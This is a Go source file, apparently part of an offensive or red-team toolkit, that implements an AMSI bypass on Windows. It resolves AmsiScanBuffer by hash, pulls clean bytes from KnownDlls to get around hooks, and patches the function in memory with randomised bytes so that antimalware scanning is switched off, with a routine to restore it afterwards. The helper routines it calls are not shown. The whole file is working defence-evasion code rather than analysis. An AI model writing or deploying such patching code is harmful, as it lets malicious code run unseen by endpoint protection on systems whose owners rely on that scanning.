//go:build windows && amd64

package securityctl

import "fmt"

type AMSIControl struct {
	baseControl
	fp *funcPatch
}

func NewAMSIControl() *AMSIControl {
	return &AMSIControl{baseControl: newBaseControl("amsi")}
}

func (a *AMSIControl) Initialize() error {
	// Primary: resolve from the already-loaded amsi.dll module.
	// LoadLibraryW returns the handle of the already-loaded module,
	// so the address is in the actual code page used by the process.
	fp, err := resolveFuncByHash("amsi.dll", "AmsiScanBuffer")
	if err != nil {
		return a.markInitialized(fmt.Errorf("securityctl: amsi: resolve: %w", err))
	}

	// Fallback: use KnownDll mapping to read clean on-disk original bytes
	// if the loaded module's bytes appear hooked (non-standard prologue).
	knownDllFP, kerr := resolveFuncFromKnownDlls("amsi.dll", "AmsiScanBuffer")
	if kerr == nil && knownDllFP != nil {
		fp.orig = knownDllFP.orig
	}

	a.fp = fp
	return a.markInitialized(nil)
}

func (a *AMSIControl) Enable() error {
	if err := a.markEnabled(); err != nil {
		return err
	}
	if a.fp == nil {
		return fmt.Errorf("securityctl: amsi: not initialized")
	}
	a.fp.patch = randomPatchBytes()
	if err := applyPatch(a.fp); err != nil {
		a.markDisabled()
		return err
	}
	return nil
}

func (a *AMSIControl) Disable() error {
	a.markDisabled()
	if a.fp == nil {
		return nil
	}
	return restorePatch(a.fp)
}

func (a *AMSIControl) Restore() {
	if a.fp == nil {
		return
	}
	_ = restorePatch(a.fp)
}
